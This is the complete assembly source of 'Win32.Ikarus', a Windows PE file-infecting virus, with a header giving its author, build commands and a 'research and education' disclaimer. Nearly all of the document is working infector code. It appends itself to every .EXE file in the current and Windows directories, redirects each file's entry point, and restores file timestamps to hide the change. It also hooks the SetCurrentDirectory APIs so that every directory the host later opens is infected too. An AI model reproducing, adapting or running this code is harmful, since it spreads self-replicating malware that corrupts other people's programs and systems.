   ; comment ~
   ;
   ; NAME: Win32.Ikarus
   ; AUTHOR: Black Jack [independant Austrian Win32asm virus coder]
   ; CONTACT: Black_Jack_VX@hotmail.com | http://blackjackvx.cjb.net
   ; TYPE: fully Win32 compatible direct-acting/per-process resident PE appender
   ; SIZE: 1906 bytes
   ;
   ; DESCRIPTION:
   ; When an infected file is run, the virus gains controls. It then infects all
   ; infectable PE files in the current and the Windows directory by the standart
   ; last section expanding method. After that, it also goes per-process memory
   ; resident by hooking the ChangeDirectory API (both ANSI and unicode version)
   ; in the hosts import table, so everytime the host will change the current
   ; directory, all PE files in there will become infected too.
   ; So this is a *very* simple virus, I only did it because I wanted a really
   ; stable and compatible virus (it even works in Win32s) with a fully correct
   ; PE infection algorithm.
   ;
   ;
   ; ASSEMBLE WITH:
   ;                 tasm32 /mx /m ikarus.asm
   ;                 tlink32 /Tpe /aa ikarus.obj,,, import32.lib
   ;
   ;                 there's no need for PEWRSEC or a similar tool, because the
   ;                 virus code is stored in the data section.
   ;
   ; DISCLAIMER: I do *NOT* support the spreading of viruses in the wild.
   ;             Therefore, this source was only written for research and
   ;             education. Please do not spread it. The author can't be hold
   ;             responsible for what you decide to do with this source.
   ;
   ; ~
   ; ===========================================================================

   virus_raw_size     EQU (virus_physical_end - virus_start)
   virus_virtual_size EQU (virus_virtual_end - virus_start)
   workspace          EQU ((((virus_raw_size/1024)+1)*1024)+4096)

   Extrn ExitProcess:Proc
   Extrn MessageBoxA:Proc

   .386p
   .model flat
   .data
   virus_start:
           pushf                                   ; save flags
           pusha                                   ; save all registers


           CALL over_SEH_handler                   ; push offset of SEH handler

           mov esp, fs:[0]                         ; restore ESP
           JMP return_to_host                      ; jump back to host

   over_SEH_handler:
           push dword ptr fs:[0]                   ; save old SEH pointer
           mov fs:[0], esp                         ; set new SEH frame


           call next                               ; get delta offset
   next:
           pop ebp
           sub ebp, (next-virus_start)

           mov eax, ebp                            ; EAX=delta offset

           db 2Dh                                  ; sub eax, imm32
   virus_RVA dd 2000h                              ; RVA of virus

           mov [ebp+imagebase-virus_start], eax    ; EAX=imagebase of host
           push eax                                ; save imagebase

           db 05h                                  ; add eax, imm32
   host_entry_RVA dd 1000h                         ; original host entry RVA

           mov [ebp+host_entry-virus_start], eax   ; EAX=host entrypoint

           xor eax, eax                            ; EAX=0
           lea edi, [ebp+GetModuleHandleA-virus_start]
           stosd                                   ; zeroinit important API VAs
           stosd
           stosd

           mov [ebp+kernel32descr-virus_start], eax ; zero init var

           pop eax                                 ; EAX=imagebase

           mov ebx, eax                            ; EBX=imagebase
           add ebx, [eax+3Ch]                      ; EBX=host PE header
           mov ebx, [ebx+128]                      ; EBX=import directory RVA
           add ebx, eax                            ; EBX=import directory VA

   search_kernel32_import_descriptor:
           mov esi, [ebx+12]                       ; ESI=dll name RVA
           or esi, esi                             ; a zero means end of table
           JZ import_method_failed                 ; kernel32 import descriptor
                                                   ; not found
           add esi, eax                            ; ESI=dll name VA

           mov ecx, dword ptr [esi]                ; get first dword of dll name
           and ecx, not 20202020h                  ; make uppercase
           cmp ecx, "NREK"                         ; is it KERNEL32 ?
           JNE try_next_import_descriptor
           mov ecx, dword ptr [esi+4]              ; check next dword
           and cx, not 2020h
           cmp ecx, "23LE"
           JE kernel32_import_descriptor_found

   try_next_import_descriptor:
           add ebx, 20                             ; go to next import descriptor
           JMP search_kernel32_import_descriptor

   kernel32_import_descriptor_found:
           mov [ebp+kernel32descr-virus_start], ebx ; save KERNEL32 import descr

           mov edx, [ebx]                          ; EDX=RVA of API names array
           or edx, edx                             ; not existant anymore ?
           JZ import_method_failed
           add edx, eax                            ; RVA->VA
           push 5                                  ; ECX=5
           pop ecx

   get_apis_from_imports_loop:
           movzx edi, word ptr [ebp+init_api_ptrs-virus_start+ecx*2-2]
                                                   ; EDI="RVA" to an API we're
                                                   ; searching for
           add edi, ebp                            ; add delta offset

           push ecx                                ; save ECX (counter)
           CALL search_API_in_imports              ; search this API in imports
           or esi, esi
           JZ this_API_not_found
           pop ecx                                 ; ECX=counter
           push ecx                                ; save again
           dec ecx                                 ; make counter 0..n-1
           shr ecx, 1                              ; multiply with 2
           mov [ebp+init_api_VAs-virus_start+ecx*4], esi  ; store API offset
   this_api_not_found:
           pop ecx                                 ; restore ECX (counter)
           LOOP get_apis_from_imports_loop

           mov ecx, dword ptr [ebp+GetModuleHandleA-virus_start]
           JCXZ try_GetModuleHandleW               ; we haven't got this API

           lea eax, [ebp+kernel32A-virus_start]    ; EAX=pointer to KERNEL32
           push eax
           call ecx                                ; call GetModuleHandleA
           or eax, eax                             ; failed ?
           JNZ got_kernel32                        ; if not, we have K32 handle

   try_GetModuleHandleW:
           mov ecx, dword ptr [ebp+GetModuleHandleW-virus_start]
           JCXZ import_method_failed               ; we haven't got this API

           lea eax, [ebp+kernel32W-virus_start]
           push eax
           call ecx                                ; call GetModuleHandleW
           or eax, eax                             ; failed ?
           JNZ got_kernel32                        ; if not, we have K32 handle

   import_method_failed:
           mov eax, [esp+11*4]                     ; get address in kernel32
           and eax, 0FFFFF000h                     ; set it at a page start
           push 50                                 ; ECX=50 (number of pages)
           pop ecx
   scan_for_kernel32_loop:
           cmp word ptr [eax], "ZM"                ; is there an MZ header ?
           JNE scan_on_for_kernel32                ; if not, scan on
           mov ebx, eax                            ; EBX=MZ header offset
           add ebx, [eax+3Ch]                      ; EBX=new header offset
           cmp dword ptr [ebx], "EP"               ; is there a PE header ?
           JE got_kernel32                         ; if not, scan on
   scan_on_for_kernel32:
           sub eax, 1000h                          ; go down to next page
           LOOP scan_for_kernel32_loop             ; scan the next page

   kernel32_scanning_failed:
           JMP return_to_host                      ; we didn't get K32 handle :-(

   got_kernel32:
           mov [ebp+kernel32-virus_start], eax     ; save kernel32 address

           cmp dword ptr [ebp+GetProcAddress-virus_start], 0  ; have we already
                                                   ; GetProcAddress ?
           JNE got_GetProcAddress

   get_GetProcAddress_from_export_table:
           mov ebx, [eax+3Ch]                      ; EBX=PE header RVA
           add ebx, eax                            ; EBX=PE header VA
           mov ebx, [ebx+78h]                      ; EBX=export directory RVA
           add ebx, eax                            ; EBX=export directory VA

           xor ecx, ecx                            ; ECX=0
           mov edx, [ebx+18h]                      ; EDX=NumberOfNames
           mov esi, [ebx+20h]                      ; EDI=AddressOfNames array RVA
           add esi, eax                            ; EDI=AddressOfNames array VA

   search_loop:
           xchg eax, edi                           ; EDI=kernel32 base
           lodsd                                   ; EAX=next api name RVA
           xchg eax, edi                           ; EDI=next api name RVA,
                                                   ; EAX=kernel32 base
           add edi, eax                            ; EDI=next api name VA
           pusha                                   ; save all registers
           lea esi, [ebp+n_GetProcAddress-virus_start]  ; ESI=pointer to api name
           push l_GetProcAddress                   ; ECX=length of api name
           pop ecx
           cld                                     ; clear direction flag
           rep cmpsb                               ; compare api names
           popa                                    ; restore all registers
           JE found_GetProcAddress                 ; found GetProcAddress ?
           inc ecx                                 ; if not, try next api
           cmp ecx, edx                            ; all APIs done ?
           JL search_loop

   not_found_GetProcAddress:
           JMP return_to_host                      ; restore host

   found_GetProcAddress:
           mov edx, [ebx+24h]                      ; EDX=AddressOfOrdinals RVA
           add edx, eax                            ; EDX=AddressOfOrdinals VA
           movzx ecx, word ptr [edx+ecx*2]         ; ECX=API ordinal
           mov edx, [ebx+1Ch]                      ; EDX=AddressOfFunctions RVA
           add edx, eax                            ; EDX=AddressOfFunctions VA
           mov edx, [edx+ecx*4]                    ; EDX=API RVA
           add edx, eax                            ; EDX=API VA
           mov dword ptr [ebp+GetProcAddress-virus_start], edx    ; store it


   got_GetProcAddress:
           lea esi, [ebp+kernel32_APIname_pointers-virus_start]
           lea edi, [ebp+kernel32_API_RVAs-virus_start]
           push number_of_kernel32_APIs
           pop ecx

   get_kernel32_APIs_loop:
           push ecx                                ; save api counter

           xor eax, eax                            ; EAX=0
           lodsw                                   ; AX=next api name RVA
           add eax, ebp                            ; EAX=next api name VA

           push eax                                ; api name VA
           push dword ptr [ebp+kernel32-virus_start] ; kernel32 base address
           CALL dword ptr [ebp+GetProcAddress-virus_start]

           stosd                                   ; store api address

           pop ecx                                 ; restore api counter

           or eax, eax                             ; last api not found ?
           JZ return_to_host                       ; if so, return to host
           LOOP get_kernel32_APIs_loop             ; do next api

   ; ----- INFECT CURRENT DIR & WINDOWS DIR ------------------------------------

           lea eax, [ebp+curdir-virus_start]       ; get current directory
           push eax
           push 260
           CALL dword ptr [ebp+GetCurrentDirectoryA-virus_start]

           push 260                                ; get windows directory
           lea eax, [ebp+windir-virus_start]
           push eax
           CALL dword ptr [ebp+GetWindowsDirectoryA-virus_start]

           lea eax, [ebp+windir-virus_start]       ; change to windows direcory
           push eax                                ; using our own API hook, so
           CALL SetCurrentDirectoryA_hook          ; all files in there will
                                                   ; become infected

           lea eax, [ebp+curdir-virus_start]       ; change back to old directory
           push eax                                ; using our own API hook, so
           CALL SetCurrentDirectoryA_hook          ; all files in there will
                                                   ; become infected

   ; ----- GO PER-PROCESS-RESIDENT ---------------------------------------------

           mov eax, [ebp+imagebase-virus_start]    ; EAX=our own imagebase
           mov ebx, [ebp+kernel32descr-virus_start] ; EBX=K32 import descriptor
           or ebx, ebx                             ; no K32 import descriptor ?
           JZ no_perprocess_residency
           mov edx, [ebx]                          ; EDX=RVA to API names array
           or edx, edx                             ; not existant ?
           JZ no_perprocess_residency
           add edx, eax                            ; RVA->VA

           lea edi, [ebp+n_SetCurrentDirectoryA-virus_start]
           CALL search_API_in_imports              ; search this API in imports
           or esi, esi                             ; found ?
           JZ no_SetCurrentDirectoryA_hook
           lea esi, [ebp+SetCurrentDirectoryA_hook-virus_start]
           mov edi, ecx
           CALL make_writeable                     ; make this page writeable
           mov [edi], esi                          ; hook this API
   no_SetCurrentDirectoryA_hook:

           lea edi, [ebp+n_SetCurrentDirectoryW-virus_start]
           CALL search_API_in_imports              ; search this API in imports
           or esi, esi                             ; found ?
           JZ no_SetCurrentDirectoryW_hook
           lea esi, [ebp+SetCurrentDirectoryW_hook-virus_start]
           mov edi, ecx
           CALL make_writeable                     ; make this page writeable
           mov [edi], esi                          ; hook this API
   no_SetCurrentDirectoryW_hook:
   no_perprocess_residency:


   return_to_host:
           pop dword ptr fs:[0]                    ; remove SEH
           pop eax

           popa                                    ; restore all registers
           popf                                    ; restore flags

           db 0B8h                                 ; mov eax, imm32
   host_entry dd ?                                 ; true host entry VA

           JMP eax                                 ; jump to host


           db "Win32.Ikarus by Black Jack", 0
           db "written in Austria in the year 2001", 0

   ; ----- API HOOKS -----------------------------------------------------------

   SetCurrentDirectoryA_hook:
           CALL delta_to_EAX                       ; get delta offset to EAX
           pop dword ptr [eax+return_address-virus_start] ; store return address
           CALL dword ptr [eax+_SetCurrentDirectoryA-virus_start] ; call original
                                                   ; API handler to change dir
           JMP SetCurrentDirectoryX_hook           ; go on with general handler

   SetCurrentDirectoryW_hook:
           CALL delta_to_EAX                       ; get delta offset to EAC
           pop dword ptr [eax+return_address-virus_start] ; store return address
           CALL dword ptr [eax+_SetCurrentDirectoryW-virus_start] ; call original
                                                   ; API handler to change dir

   SetCurrentDirectoryX_hook:
           push eax                                ; make room on stack for
                                                   ; return address
           pushf                                   ; store flags
           pusha                                   ; store all registers
           CALL delta_to_EAX                       ; get delta offset to EAX
           xchg ebp, eax                           ; delta offset to EBP
           mov eax, dword ptr [ebp+return_address-virus_start]
           mov [esp+9*4], eax                      ; set return address on stack
           CALL infect_directory                   ; infect new directory
           popa                                    ; restore all registers
           popf                                    ; restore all flags
           RET


   delta_to_EAX:
           CALL hook_next                          ; get delta offset
   hook_next:
           pop eax
           sub eax, (hook_next - virus_start)
           RET

   ; ----- SEARCH APIs IN THE IMPORT TABLE -------------------------------------

   search_API_in_imports:
           xor ecx, ecx

   search_api_in_imports_loop:
           mov esi, [edx+ecx*4]
           or esi, esi
           JZ api_not_found
           inc esi
           inc esi
           add esi, eax

           pusha

   cmp_api_name_loop:
           lodsb
           cmp al, 0
           JE api_name_equal
           scasb
           JE cmp_api_name_loop

   api_name_not_equal:
           popa
           inc ecx
           JMP search_api_in_imports_loop

   api_name_equal:
           popa
           mov esi, [ebx+16]
           add esi, eax
           lea ecx, [esi+ecx*4]
           mov esi, [ecx]
           RET

   api_not_found:
           xor esi, esi
           RET


   ; ----- INFECT CURRENT DIRECTORY --------------------------------------------

   infect_directory:
           lea eax, [ebp+find_data-virus_start]    ; address of FindData struc
           push eax
           lea eax, [ebp+filemask-virus_start]     ; address of filemask
           push eax
           call [ebp+FindFirstFileA-virus_start]
           inc eax
           JZ exit_infect_directory
           dec eax
           push eax

   infect_found_file:
           lea edi, [ebp+filename-virus_start]
           CALL infect_file

   find_next:
           pop edx
           push edx
           lea eax, [ebp+find_data-virus_start]    ; offset of find data struc
           push eax
           push edx                                ; search handle
           call [ebp+FindNextFileA-virus_start]
           dec eax                                 ; EAX=1 if file found
           JZ infect_found_file                    ; if file found, infect it

   find_close:
           call [ebp+FindClose-virus_start]

   exit_infect_directory:
           RET

   ; ----- INFECT FILE ---------------------------------------------------------

   infect_file:
           push edi
           call dword ptr [ebp+GetFileAttributesA-virus_start]
           inc eax
           JZ exit_infect_file
           dec eax

           push eax                                ; save attributes
           push edi                                ; save filename offset

           push 80h                                ; normal attributes
           push edi
           call dword ptr [ebp+SetFileAttributesA-virus_start]
           or eax, eax
           JZ restore_attributes

           push 0                                  ; template file (shit)
           push 80h                                ; normal file attributes
           push 3                                  ; open existing
           push 0                                  ; no security attributes
           push 0                                  ; no file share flags
           push 0C0000000h                         ; read/write mode
           push edi                                ; filename offset
           call dword ptr [ebp+CreateFileA-virus_start]
           inc eax
           JZ restore_attributes
           dec eax

           push eax                                ; save file handle
           xchg esi, eax                           ; filehandle to ESI

           lea eax, [ebp+LastWriteTime-virus_start]
       push eax
       sub eax, 8
       push eax
       sub eax, 8
       push eax
           push esi                                ; filehandle
           call [ebp+GetFileTime-virus_start]
       or eax, eax
           JZ close_file

       push 0                                  ; high filesize dword ptr
           push esi                                ; filehandle
           call [ebp+GetFileSize-virus_start]
           mov [ebp+filesize-virus_start], eax
       inc eax
           JZ close_file

           add eax, workspace-1

       push 0                                  ; name file mapping obj (shit)
           push eax                                ; low dword of filesize
       push 0                                  ; high dword of filesize
       push 4                                  ; PAGE_READWRITE
       push 0                                  ; security attributes (shit)
           push esi                                ; filehandle
           call [ebp+CreateFileMappingA-virus_start]
       or eax, eax                             ; close?
           JZ restore_filetime

           push eax                                ; save maphandle

       push 0                                  ; map the whole file
       push 0                                  ; low dword of fileoffset
       push 0                                  ; high dword of fileoffset
       push 2                                  ; read/write access
           push eax                                ; maphandle
           call [ebp+MapViewOfFile-virus_start]
       or eax, eax
           JZ close_filemapping

           push eax                                ; save mapbase
           mov [ebp+mapbase-virus_start], eax

           cmp word ptr [eax], "ZM"
           JNE unmap_file
           mov ebx, dword ptr [eax+3Ch]            ; new exe header pointer
           cmp ebx, [ebp+filesize-virus_start]
           JA unmap_file
           add ebx, eax
           cmp dword ptr [ebx], "EP"
           JNE unmap_file

           mov cx, word ptr [ebx+4]                ; machine type - we only
                                                   ; infect files for intel CPUs
           cmp cx, 14Ch                            ; 386 ?
           JB unmap_file
           cmp cx, 14Eh                            ; pentium ?
           JA unmap_file

           mov cx, word ptr [ebx+22]               ; characteristics
           test cx, 2                              ; is file an executable image?
           JZ unmap_file
           test cx, 3000h                          ; don't infect DLLs/drivers
           JNZ unmap_file

           mov cx, word ptr [ebx+5Ch]              ; subsystem
           cmp cx, 2                               ; Win32 GUI application?
           JE subsystem_ok
           cmp cx, 3                               ; Win32 console app ?
           JNE unmap_file
   subsystem_ok:

           cmp dword ptr [ebx+58h], 12345678h      ; check for our infection mark
           JE unmap_file

           mov eax, [ebp+filesize-virus_start]
           mov edx, [ebx+38h]                      ; EDX=SectionAlign
           call align_eax
           mov [ebp+aligned_filesize-virus_start], eax


           movzx ecx, word ptr [ebx+14h]           ; ECX=size of optional header
           add ecx, ebx                            ; add offset of PE header
           add ecx, 18h                            ; add size of file header

           movzx edx, word ptr [ebx+6]             ; EDX=number of sections
           dec edx                                 ; EDX=number of last section
           imul edx, edx, 28h                      ; EDX=size of n-1 sect.-hdrs
           add ecx, edx                            ; ECX=last sect.-hdr offset

           mov eax, [ecx+14h]                      ; PointerToRawData
           add eax, [ecx+10h]                      ; SizeOfRawData
           mov edx, [ebx+38h]                      ; EDX=SectionAlign
           CALL align_eax
           cmp eax, [ebp+aligned_filesize-virus_start]
           JNE unmap_file                          ; file has overlays?

           mov edi, [ecx+8]                        ; EDI=VirtualSize of last sect
           or edi, edi                             ; If VirtualSize=0, this
           JNZ VirtualSize_OK                      ; means that VirtualSize=
           mov edi, [ecx+10h]                      ; SizeOfRawData
   VirtualSize_OK:
           mov eax, edi                            ; EAX=old VirtualSize
           add eax, virus_virtual_size             ; EAX=new VirtualSize
           mov [ecx+8], eax                        ; store it
           add eax, [ecx+0Ch]                      ; add VirtualAddress
           mov edx, [ebx+38h]                      ; EDX=SectionAlign
           CALL align_eax                          ; EAX=new Imagesize
           cmp [ebx+50h], eax                      ; imagesize big enough?
           JA imagesize_ok
           mov [ebx+50h], eax                      ; update imagesize
   imagesize_ok:
           mov eax, edi                            ; EAX=old VirtualSize
           add eax, virus_raw_size                 ; EAX=new SizeOfRawData
           mov edx, [ebx+3Ch]                      ; EDX=FileAlign
           CALL align_eax
           mov [ecx+10h], eax                      ; save new SizeOfRawData
           add eax, [ecx+14h]                      ; add PointerToRawData
           mov [ebp+FileSize-virus_start], eax     ; save new filesize
           mov eax, edi                            ; EAX=old VirtualSize
           add eax, [ecx+0Ch]                      ; Add VirtualAddress

           push dword ptr [ebp+virus_RVA-virus_start]
           push dword ptr [ebp+host_entry_RVA-virus_start]

           mov [ebp+virus_RVA-virus_start], eax    ; save VirusRVA
           xchg [ebx+28h], eax                     ; set new entrypoint
           mov [ebp+host_entry_RVA-virus_start], eax  ; save old entrypoint

           or dword ptr [ecx+24h], 0C0000000h      ; make section read/write

           push esi
           add edi, [ecx+14h]                      ; add PointerToRawData
           add edi, [ebp+mapbase-virus_start]      ; EDI=virus offset in memmap
           mov esi, ebp                            ; ESI=start virus body
           mov ecx, virus_raw_size
           cld
           rep movsb
           pop esi

           pop dword ptr [ebp+host_entry_RVA-virus_start]
           pop dword ptr [ebp+virus_RVA-virus_start]

           mov dword ptr [ebx+58h], 12345678h      ; set our infection mark

   unmap_file:
           call dword ptr [ebp+UnmapViewOfFile-virus_start]

   close_filemapping:
           call dword ptr [ebp+CloseHandle-virus_start]

   set_filesize:
       push 0                                  ; move relative to start of file
       push 0                                  ; high word pointer of file offset
           push dword ptr [ebp+FileSize-virus_start]  ; new filesize
           push esi                                ; filehandle
           call [ebp+SetFilePointer-virus_start]

           push esi                                ; filehandle
           call [ebp+SetEndOfFile-virus_start]

   restore_filetime:
           lea eax, [ebp+LastWriteTime-virus_start]
       push eax
       sub eax, 8
       push eax
       sub eax, 8
       push eax
           push esi
           call [ebp+SetFileTime-virus_start]

   close_file:
           call dword ptr [ebp+CloseHandle-virus_start]

   restore_attributes:
           call dword ptr [ebp+SetFileAttributesA-virus_start]

   exit_infect_file:
           RET

   ; ---------------------------------------------------------------------------

   align_eax:
           push ebx
           mov ebx, edx
           xor edx, edx
           div ebx
           or edx, edx                             ; remainer zero?
           JZ no_round_up                          ; if so, don't round up
           inc eax                                 ; round up
   no_round_up:
           mul ebx                                 ; multiply again
           pop ebx
           RET


   make_writeable:
           pusha

           lea eax, [ebp+dummy-virus_start]
           push eax                                ; var to store old protection
           push 4                                  ; PAGE_READWRITE
           push 4                                  ; one dword
           push ecx                                ; RVA
           CALL [ebp+VirtualProtect-virus_start]

           popa
           RET



   kernel32A               db "KERNEL32"
   l_kernel32A             EQU ($ - kernel32A)
                           db 0
   kernel32W               dw "K", "E", "R", "N", "E", "L", "3", "2", 0

   n_GetModuleHandleA      db "GetModuleHandleA", 0
   n_LoadLibraryA          db "LoadLibraryA", 0
   n_GetModuleHandleW      db "GetModuleHandleW", 0
   n_LoadLibraryW          db "LoadLibraryW", 0
   n_GetProcAddress        db "GetProcAddress", 0
   l_GetProcAddress        EQU ($ - n_GetProcAddress)

   n_FindFirstFileA        db "FindFirstFileA", 0
   n_FindNextFileA         db "FindNextFileA", 0
   n_FindClose             db "FindClose", 0

   n_GetWindowsDirectoryA  db "GetWindowsDirectoryA", 0
   n_GetCurrentDirectoryA  db "GetCurrentDirectoryA", 0

   n_GetFileAttributesA    db "GetFileAttributesA", 0
   n_SetFileAttributesA    db "SetFileAttributesA", 0
   n_CreateFileA           db "CreateFileA", 0
   n_GetFileSize           db "GetFileSize", 0
   n_GetFileTime           db "GetFileTime", 0
   n_SetFileTime           db "SetFileTime", 0
   n_CreateFileMappingA    db "CreateFileMappingA", 0
   n_MapViewOfFile         db "MapViewOfFile", 0
   n_SetEndOfFile          db "SetEndOfFile", 0
   n_SetFilePointer        db "SetFilePointer", 0
   n_UnmapViewOfFile       db "UnmapViewOfFile", 0
   n_CloseHandle           db "CloseHandle", 0

   n_VirtualProtect        db "VirtualProtect", 0

   n_SetCurrentDirectoryA  db "SetCurrentDirectoryA", 0
   n_SetCurrentDirectoryW  db "SetCurrentDirectoryW", 0



   init_api_ptrs:
                           dw (n_GetModuleHandleA - virus_start)
                           dw (n_LoadLibraryA - virus_start)
                           dw (n_GetModuleHandleW - virus_start)
                           dw (n_LoadLibraryW - virus_start)
                           dw (n_GetProcAddress - virus_start)

   kernel32_APIname_pointers:
                           dw (n_LoadLibraryA - virus_start)
                           dw (n_FindFirstFileA - virus_start)
                           dw (n_FindNextFileA - virus_start)
                           dw (n_FindClose - virus_start)
                           dw (n_GetWindowsDirectoryA - virus_start)
                           dw (n_GetCurrentDirectoryA - virus_start)
                           dw (n_GetFileAttributesA - virus_start)
                           dw (n_SetFileAttributesA - virus_start)
                           dw (n_CreateFileA - virus_start)
                           dw (n_GetFileSize - virus_start)
                           dw (n_GetFileTime - virus_start)
                           dw (n_SetFileTime - virus_start)
                           dw (n_CreateFileMappingA - virus_start)
                           dw (n_MapViewOfFile - virus_start)
                           dw (n_SetEndOfFile - virus_start)
                           dw (n_SetFilePointer - virus_start)
                           dw (n_UnmapViewOfFile - virus_start)
                           dw (n_CloseHandle - virus_start)
                           dw (n_VirtualProtect - virus_start)
                           dw (n_SetCurrentDirectoryA - virus_start)
                           dw (n_SetCurrentDirectoryW - virus_start)
   number_of_kernel32_APIs EQU (($ - kernel32_APIname_pointers) / 2)


   filemask        db "*.EXE", 0


   virus_physical_end:

   return_address          dd ?

   dummy                   dd ?

   mapbase                 dd ?

   imagebase               dd ?

   kernel32                dd ?

   kernel32descr           dd ?

   aligned_filesize        dd ?


   init_api_VAs:
   GetModuleHandleA        dd ?
   GetModuleHandleW        dd ?
   GetProcAddress          dd ?


   kernel32_API_RVAs:
   LoadLibraryA            dd ?
   FindFirstFileA          dd ?
   FindNextFileA           dd ?
   FindClose               dd ?
   GetWindowsDirectoryA    dd ?
   GetCurrentDirectoryA    dd ?
   GetFileAttributesA      dd ?
   SetFileAttributesA      dd ?
   CreateFileA             dd ?
   GetFileSize             dd ?
   GetFileTime             dd ?
   SetFileTime             dd ?
   CreateFileMappingA      dd ?
   MapViewOfFile           dd ?
   SetEndOfFile            dd ?
   SetFilePointer          dd ?
   UnmapViewOfFile         dd ?
   CloseHandle             dd ?
   VirtualProtect          dd ?
   _SetCurrentDirectoryA    dd ?
   _SetCurrentDirectoryW    dd ?



   find_data:
   FileAttributes          dd ?
   CreationTime            dq ?
   LastAccessTime          dq ?
   LastWriteTime           dq ?
   FileSize                dq ?
   wfd_reserved            dq ?
   FileName                db 260 dup(?)
   DosFileName             db 14 dup(?)

   windir                  db 260 dup(?)
   curdir                  db 260 dup(?)



   virus_virtual_end:

   .code
   start:

   quit_first_gen:
           push 0
           push offset caption
           push offset message
           push 0
           CALL MessageBoxA

           push 0
           call ExitProcess

   caption db "Win32.Ikarus by Black Jack", 0
   message db "first genertion virus sample", 0

   end virus_start
